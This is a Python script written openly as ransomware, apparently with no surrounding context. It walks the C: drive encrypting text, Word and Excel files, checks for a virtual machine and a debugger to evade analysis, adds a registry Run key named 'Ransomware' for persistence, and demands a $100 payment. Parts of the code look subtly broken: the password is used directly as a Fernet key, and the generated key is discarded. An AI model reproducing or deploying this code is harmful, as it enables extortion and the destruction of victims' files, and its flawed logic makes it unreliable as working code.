import os
import sys
import time
from cryptography.fernet import Fernet
import requests
import winreg

def generate_key(password):
    key = Fernet.generate_key()
    f = Fernet(key)
    encrypted_key = f.encrypt(password.encode())
    with open("key.key", "wb") as key_file:
        key_file.write(encrypted_key)

def load_key(password):
    with open("key.key", "rb") as key_file:
        encrypted_key = key_file.read()
    f = Fernet(password.encode())
    decrypted_key = f.decrypt(encrypted_key)
    return Fernet(decrypted_key)

def encrypt_file(filename, key):
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = key.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt_file(filename, key):
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = key.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def encrypt_files(key):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.endswith(".txt") or file.endswith(".docx") or file.endswith(".xlsx"):
                encrypt_file(os.path.join(root, file), key)

def decrypt_files(key):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.endswith(".txt") or file.endswith(".docx") or file.endswith(".xlsx"):
                decrypt_file(os.path.join(root, file), key)

def is_virtual_machine():
    try:
        with open("C:\\Windows\\System32\\scsi0.sys", "rb") as f:
            data = f.read(1024)
            if "VMware" in str(data):
                return True
    except:
        pass
    return False

def is_debugger_present():
    try:
        if os.system("tasklist | findstr \"windbg.exe\"") == 0:
            return True
    except:
        pass
    return False

def create_persistence():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Ransomware", 0, winreg.REG_SZ, sys.executable)
    winreg.CloseKey(key)

def main():
    password = input("Enter password to encrypt files: ")
    print("Generating encryption key...")
    generate_key(password)
    key = load_key(password)

    if is_virtual_machine() or is_debugger_present():
        print("Cannot run on virtual machine or in debugger. Exiting.")
        sys.exit(0)

    print("Encrypting files...")
    encrypt_files(key)

    print("Your files have been encrypted!")
    print("Please send us $100 to restore access to your files.")
    
    while True:
        payment = input("Enter payment amount: ")
        if payment == "$100":
            print("Payment received. Decrypting files...")
            decrypt_files(key)
            print("Files decrypted. Have a nice day!")
            break
        else:
            print("Incorrect payment amount. Please try again.")

    create_persistence()

if __name__ == "__main__":
    main()